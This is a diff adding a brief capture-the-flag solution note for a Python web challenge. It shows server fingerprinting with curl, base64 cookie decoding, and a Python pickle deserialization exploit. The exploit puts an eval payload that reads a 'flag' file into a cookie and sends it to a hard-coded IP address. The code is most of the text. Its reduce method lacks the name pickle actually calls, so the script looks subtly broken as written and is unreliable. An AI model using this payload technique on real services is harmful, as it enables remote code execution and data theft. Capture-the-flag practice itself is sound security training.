@@ -1,0 +1,21 @@
+let's see what server the website is running on with curl
+curl -I "url"
+we see that it runs on python so we get our set-cookie which we are going to decode
+echo -n "..." | base64 -d
+the cookies seem to be encrypted in base64 so we need to find a python code 
+
+import pickle 
+import base64
+import requests
+class Exploit (object):
+        def reduce (self):
+                return eval, ("open('flag', 'r').read()", )
+def sendPayload(p):
+        print (base64.urlsafe_b64encode(p))
+        headers ={"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
+        t = requests.get("http://34.141.39.165:31924/dashboard", headers=headers) 
+        print(t.text)
+sendPayload(pickle.dumps(Exploit(), protocol=2))
+
+
+
